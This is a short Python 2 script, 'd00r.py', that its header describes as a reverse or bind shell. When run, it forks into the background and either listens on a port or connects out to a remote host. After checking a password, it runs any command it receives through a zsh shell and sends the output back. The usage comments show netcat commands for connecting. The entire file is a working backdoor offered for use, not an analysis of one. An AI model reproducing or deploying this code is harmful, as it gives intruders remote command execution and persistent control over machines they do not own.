#!/usr/bin/env python

# # # # # # # # # # # # # # # # # # # # # # # # # # # # #
#   d00r.py 0.3a (reverse|bind)-shell in python by fQ	#
#							#
#	alpha						#
#							#
#							#
# usage: 						#
# 	% ./d00r -b password port			#
#	% ./d00r -r password port host			#
#	% nc host port					#
#	% nc -l -p port (please use netcat)		#
# # # # # # # # # # # # # # # # # # # # # # # # # # # #	#


import os, sys, socket, time


# =================== var =======
MAX_LEN=1024
SHELL="/bin/zsh -c"
TIME_OUT=300 #s
PW=""
PORT=""
HOST=""


# =================== funct =====
# shell - exec command, return stdout, stderr; improvable
def shell(cmd):
	sh_out=os.popen(SHELL+" "+cmd).readlines()
	nsh_out=""
	for i in range(len(sh_out)):	
		nsh_out+=sh_out[i]
	return nsh_out	

# action?
def action(conn):
	conn.send("\nPass?\n")
	try: pw_in=conn.recv(len(PW))
	except: print "timeout"
	else:	
		if pw_in == PW:	
			conn.send("j00 are on air!\n")						
			while True:               		
				conn.send(">>> ")
				try:
					pcmd=conn.recv(MAX_LEN)
				except:
					print "timeout"
					return True					
				else:
					#print "pcmd:",pcmd
					cmd=""#pcmd
					for i in range(len(pcmd)-1):
						cmd+=pcmd[i]
			                if cmd==":dc":
						return True
					elif cmd==":sd":
						return False
					else:
						if len(cmd)>0:
							out=shell(cmd)
							conn.send(out)


# =================== main ======
argv=sys.argv

if len(argv)<4: 
	print "error; help: head -n 16 d00r.py"
	sys.exit(1)
elif argv[1]=="-b": 
	PW=argv[2]
	PORT=argv[3]
elif argv[1]=="-r" and len(argv)>4:
	PW=argv[2]
	PORT=argv[3]
	HOST=argv[4]
else: exit(1)

PORT=int(PORT)
print "PW:",PW,"PORT:",PORT,"HOST:",HOST
	
#sys.argv[0]="d00r"

# exit father proc
if os.fork()!=0: 
	sys.exit(0)

# associate the socket
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(TIME_OUT)

if argv[1]=="-b":
	sock.bind(('localhost', PORT))
	sock.listen(0)

run=True
while run:

	if argv[1]=="-r":
		try: sock.connect( (HOST, PORT) )
		except: 
			print "host unreachable"
			time.sleep(5)
		else: run=action(sock)
	else:		
		try:	(conn,addr)=sock.accept()
		except: 
			print "timeout"
			time.sleep(1)
		else: run=action(conn)			
	
	# shutdown the sokcet
	if argv[1]=="-b": conn.shutdown(2)
	else:
		try: sock.send("")
		except: time.sleep(1)
		else: sock.shutdown(2)
